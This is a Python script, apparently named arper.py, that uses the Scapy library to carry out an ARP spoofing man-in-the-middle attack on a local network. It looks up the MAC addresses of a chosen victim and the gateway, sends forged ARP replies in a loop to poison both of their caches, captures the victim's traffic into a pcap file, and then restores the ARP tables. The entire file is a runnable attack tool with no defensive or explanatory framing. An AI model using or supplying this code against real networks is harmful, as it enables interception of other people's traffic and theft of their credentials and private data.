from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, srp, wrpcap
import os
import sys
import time


def get_mac(targetip):
    print(f"[INFO] Getting MAC address for {targetip}")
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=targetip)
    response, _ = srp(packet, iface="wlp0s20f3", timeout=2, retry=10, verbose=False)  # Force l'utilisation de wlp0s20f3
    if response:
        for _, r in response:
            mac = r[Ether].src
            print(f"[INFO] MAC address for {targetip} is {mac}")
            return mac
    print(f"[WARNING] MAC address for {targetip} could not be found.")
    return None


class Arper:
    def __init__(self, victim, gateway, interface='wlp0s20f3'):
        print(f"[INFO] Initializing ARP attack for victim: {victim}, gateway: {gateway}, interface: {interface}")
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = self.interface
        conf.verb = 0
        print(f"[INFO] Initialized {interface}:")
        print(f"[INFO] Gateway ({gateway}) is at {self.gatewaymac}")
        print(f"[INFO] Victim ({victim}) is at {self.victimmac}")
        print('-'*30)

    def run(self):
        print("[INFO] Starting ARP poisoning and packet sniffing")
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'[INFO] Starting ARP poisoning. Press [CTRL+C] to stop.')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim, iface=self.interface, verbose=False)  # Force l'utilisation de wlp0s20f3
                send(poison_gateway, iface=self.interface, verbose=False)  # Force l'utilisation de wlp0s20f3
            except KeyboardInterrupt:
                print("\n[INFO] Stopping ARP poisoning and restoring ARP tables.")
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=100):
        time.sleep(5)
        print(f"[INFO] Sniffing {count} packets")
        bpf_filter = "ip host %s" % self.victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)  # Forcer l'interface
        wrpcap('arper.pcap', packets)
        print(f"[INFO] {count} packets captured and saved to arper.pcap")
        self.restore()
        self.poison_thread.terminate()
        print(f"[INFO] Finished sniffing and restored ARP tables.")

    def restore(self):
        print('[INFO] Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5, iface=self.interface, verbose=False)  # Forcer l'interface
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5, iface=self.interface, verbose=False)  # Forcer l'interface
        print('[INFO] ARP tables restored.')


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python3 arper.py <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    (victim, gateway, interface) = sys.argv[1], sys.argv[2], sys.argv[3]
    print(f"[INFO] Victim IP: {victim}, Gateway IP: {gateway}, Interface: {interface}")
    myarp = Arper(victim, gateway, interface)
    myarp.run()
